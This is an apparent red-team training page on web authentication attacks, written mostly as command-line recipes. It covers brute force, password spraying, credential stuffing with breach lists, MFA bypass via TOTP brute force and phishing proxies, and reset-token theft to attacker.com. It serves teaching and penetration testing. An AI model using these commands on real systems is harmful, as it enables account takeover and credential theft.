---
layout: training-page
title: "Authentication Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - authentication
  - brute-force
  - credential-stuffing
  - user-enumeration
  - mfa-bypass
  - password-spraying
page_key: "web-authentication-attacks"
render_with_liquid: false
---

# Authentication Attacks

Authentication flaws are among the most impactful web vulnerabilities. This page covers user enumeration, brute force, credential stuffing, password spraying, timing attacks, MFA bypass, and authentication logic flaws — the full attacker workflow from initial access through account compromise.

## User Enumeration

Many applications leak whether a username/email exists through different error messages, response times, or HTTP status codes.

```
# Compare responses for valid vs invalid usernames:
# Valid user, wrong password:    "Invalid password"
# Invalid user:                  "User not found"
# These different messages confirm valid usernames

# HTTP status code enumeration:
# 200 + "Invalid password" = valid user
# 403 = account locked (confirms user exists)
# 404 = user not found

# Timing attack — valid user takes longer (hits password hash):
# Use ffuf with response time filtering:
ffuf -u https://target.com/login -X POST \
  -d "username=FUZZ&password=invalid" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /opt/SecLists/Usernames/top-usernames-shortlist.txt \
  -mt 200   # match by response time anomaly

# Measure timing difference:
for user in admin administrator root; do
  time curl -s -o /dev/null -X POST https://target.com/login \
    -d "username=$user&password=wrong123"
done

# Registration endpoint — "username already taken" confirms enumeration:
curl -s -X POST https://target.com/register \
  -d "username=admin&email=test@test.com&password=Test123!"

# Password reset — different messages leak account existence:
# "We sent a reset link" vs "Email not found"
```

## Brute Force and Password Spraying

```
# Hydra — HTTP POST form brute force:
hydra -l admin -P /opt/SecLists/Passwords/darkweb2017-top100.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Hydra — HTTP GET basic auth:
hydra -l admin -P /opt/SecLists/Passwords/darkweb2017-top100.txt \
  -s 443 -S target.com http-get /admin/

# Password spraying — one password against many users (avoids lockout):
# Collect usernames from LinkedIn, email format guessing, enumeration
# spray.py or Ruler for Office 365
spray.py -t https://target.com/login \
  -u users.txt -p "Winter2024!" \
  -s 1  # 1 attempt per user per interval

# ffuf spraying approach:
ffuf -u https://target.com/login -X POST \
  -d "username=FUZZ&password=Winter2024!" \
  -w usernames.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302   # match redirects (successful login)

# Account lockout bypass — rotate IPs or use X-Forwarded-For:
# Some apps trust X-Forwarded-For for rate limiting
curl -X POST https://target.com/login \
  -H "X-Forwarded-For: 1.2.3.FUZZ" \
  -d "username=admin&password=PASS"

# Username: admin, X-Forwarded-For: 1.2.3.1, 1.2.3.2, 1.2.3.3...
# Each "IP" gets its own lockout counter
```

## Credential Stuffing

```
# Use breach database credentials against the target
# Sources: HaveIBeenPwned, dehashed.com, breach-parse

# breach-parse (from TCM):
breach-parse "@target.com" target_credentials.txt

# credential-stuffing with hydra:
# Format: username:password pairs
hydra -C combo_list.txt target.com http-post-form \
  "/login:email=^USER^&password=^PASS^:Invalid"

# Snipr — dedicated credential stuffing tool:
# Handles CAPTCHAs, proxies, rate limiting

# Validate found credentials manually:
curl -s -c cookies.txt -X POST https://target.com/login \
  -d "username=victim@email.com&password=FoundPassword123" \
  -L | grep -i "dashboard\|account\|welcome"

# After successful login — check session cookies:
cat cookies.txt
```

## Timing Attacks on Authentication

```
# Constant-time comparison failures reveal valid users/hashes
# Measure response time variance:

# Python timing test:
import time, requests

def test_timing(username, password):
    start = time.time()
    r = requests.post('https://target.com/login',
        data={'username': username, 'password': password})
    return time.time() - start

# Compare valid user (slow — hashes password) vs invalid (fast — exits early):
valid_user_time = test_timing('admin', 'wrongpassword')
invalid_user_time = test_timing('nonexistent_user_12345', 'wrongpassword')
print(f"Valid: {valid_user_time:.3f}s, Invalid: {invalid_user_time:.3f}s")

# Timing difference > 50-100ms = likely timing leak

# Use Turbo Intruder (Burp) for accurate parallel timing:
# Send same-time requests, compare response time distribution
```

## MFA Bypass Techniques

```
# 1. Skip MFA step entirely — direct navigation after auth:
# Login → redirected to /mfa-verify → try navigating to /dashboard directly
curl -c cookies.txt -b cookies.txt https://target.com/dashboard
# If you get the dashboard, MFA is not enforced server-side

# 2. Response manipulation — change "mfa_required: true" to false in response:
# Use Burp Proxy → intercept response to login → modify JSON
# {"status":"mfa_required"} → {"status":"ok"}

# 3. Code brute force — 6-digit TOTP only 1,000,000 options:
# If no rate limiting on /verify-code:
ffuf -u https://target.com/verify-code -X POST \
  -d "code=FUZZ" -w <(seq -w 0 999999) \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "session=VALID_PARTIAL_AUTH_SESSION" \
  -mc 302

# 4. SMS/Email code theft via phishing — real-time phishing proxy:
# evilginx2, Modlishka — proxy real site, steal session after MFA
evilginx2  # configure phishlet for target

# 5. Backup codes — test if backup codes are guessable or reusable:
# POST /backup-code with common codes: 12345678, 00000000, 11111111

# 6. Code leakage — check JS source, error messages, headers for OTP:
# Some poorly coded apps include code in response: {"code":"123456","message":"Code sent"}

# 7. SIM swapping (for SMS-based MFA) — social engineering carrier
```

## Password Reset Flaws

```
# 1. Predictable reset tokens:
# Request reset for your account → capture token → analyze pattern
# Token: reset_1706123456 (timestamp-based = predictable)
# Token: dGVzdEBleGFtcGxlLmNvbQ== (base64 email = no entropy)

# 2. Token reuse — use old/expired tokens:
curl -X POST https://target.com/reset-password \
  -d "token=OLD_TOKEN_FROM_EMAIL&password=NewPassword123"

# 3. No token expiry — tokens valid indefinitely:
# Save a reset token, wait hours/days, use it later

# 4. Host header injection in reset emails:
# Application uses Host header to construct reset URL
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"
# Reset link sent to victim: https://attacker.com/reset?token=xxx
# Victim clicks → attacker sees token in server logs

# 5. Parameter pollution — add your email alongside victim:
curl -X POST https://target.com/forgot-password \
  -d "email=victim@example.com&email=attacker@example.com"

# 6. JSON parameter pollution:
# {"email": "victim@example.com"} → {"email": ["victim@example.com", "attacker@example.com"]}
```

## OAuth / SSO Attack Patterns

```
# OAuth state parameter bypass (CSRF on OAuth):
# If state parameter is absent or not validated:
# Attacker crafts authorization URL → victim visits → attacker's code bound to victim account

# Authorization code theft via redirect_uri manipulation:
# If redirect_uri not strictly validated:
https://auth.target.com/oauth/authorize?
  response_type=code&client_id=CLIENT&
  redirect_uri=https://attacker.com/callback

# Code/token theft via Referer header:
# After receiving code at /callback?code=xxx
# If page loads external resource: Referer leaks the code

# Account linking abuse:
# Register attacker account, link victim's OAuth identity
# Many apps allow linking multiple OAuth providers to one account

# Refer to /web/oauth-attacks/ for full OAuth attack methodology
```

## Authentication Logic Flaws

```
# Mass assignment — include admin=true in registration:
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Pass123","role":"admin","isAdmin":true}'

# Authentication bypass via SQL injection in login:
# Username: admin'--
# Password: anything
# Query becomes: SELECT * FROM users WHERE username='admin'--' AND password='...'
# The -- comments out password check

# Type juggling (PHP loose comparison):
# If app uses == instead of ===:
# Hash: "0e123456789" == 0 in PHP (both are "0" in scientific notation)
# Supply password whose MD5 starts with "0e" — "magic hash"

# Race condition on account verification:
# Register, immediately try to login before email verification
# Or: send two simultaneous password reset requests

# Remember-me token analysis:
# Capture remember_me cookie, decode (often base64):
echo "cmVtZW1iZXJfbWVfdG9rZW4=" | base64 -d
# If it contains: user_id|hash — may be forgeable if hash is weak
```

## Tools

- hydra — `github.com/vanhauser-thc/thc-hydra`
- ffuf — `github.com/ffuf/ffuf`
- Burp Suite Intruder / Turbo Intruder — for timed attacks and spraying
- evilginx2 — `github.com/kgretzky/evilginx2` — real-time phishing proxy for MFA bypass
- spray.py — `github.com/Greenwolf/Spray`
- breach-parse — `github.com/hmaverickadams/breach-parse`
- PortSwigger Authentication labs — `portswigger.net/web-security/authentication`
- SecLists — `github.com/danielmiessler/SecLists` — password and username lists

## Resources

- OWASP Authentication Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html`
- OWASP Credential Stuffing Prevention — `cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html`
- NIST SP 800-63B — Digital Identity Guidelines
- PortSwigger Authentication research — `portswigger.net/web-security/authentication`
- HaveIBeenPwned API — `haveibeenpwned.com/API/v3`
